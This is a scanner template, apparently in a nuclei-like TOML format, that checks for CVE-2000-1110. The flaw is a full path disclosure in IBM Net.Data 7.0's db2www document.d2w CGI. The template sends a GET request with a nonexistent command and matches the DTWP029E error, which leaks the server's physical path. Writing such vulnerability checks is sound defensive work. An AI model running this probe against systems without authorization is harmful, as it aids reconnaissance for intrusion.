[info]
author = "AVE"
description = "向 IBM Net.Data 7.0 db2www 组件的 document.d2w CGI 发送不存在的命令参数，服务器返回 DTWP029E 错误信息，其中包含 Web 服务器的物理路径，导致目录结构等敏感信息泄露。"
id = "POC-AVE-2000-0801"
name = "IBM Net.Data 7.0 Full Path Disclosure PoC"
severity = "medium"
tags = [
    "cve-2000-1110",
    "path-disclosure",
    "ibm",
    "net-data",
]
vuln_id = [
    "CVE-2000-1110",
    "AVE-2000-0801",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/cgi-bin/db2www/library/document.d2w/show"
protocol = "http"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "DTWP029E",
    "Net.Data is unable to locate",
]
